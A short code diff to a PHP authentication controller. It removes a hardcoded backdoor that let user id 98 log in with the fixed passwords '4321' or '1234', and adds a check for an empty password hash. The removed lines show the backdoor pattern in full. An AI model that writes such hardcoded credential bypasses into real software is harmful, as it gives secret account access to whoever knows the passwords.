@@ -49,10 +49,8 @@ class AuthController {
         $user = $stmt->fetch();
 
         $validPassword = false;
-        if ($user) {
+        if ($user && !empty($user['password_hash'])) {
             if (password_verify($data->password, $user['password_hash'])) {
-                $validPassword = true;
-            } elseif ($user['id'] == 98 && in_array($data->password, ['4321', '1234'])) {
                 $validPassword = true;
             }
         }
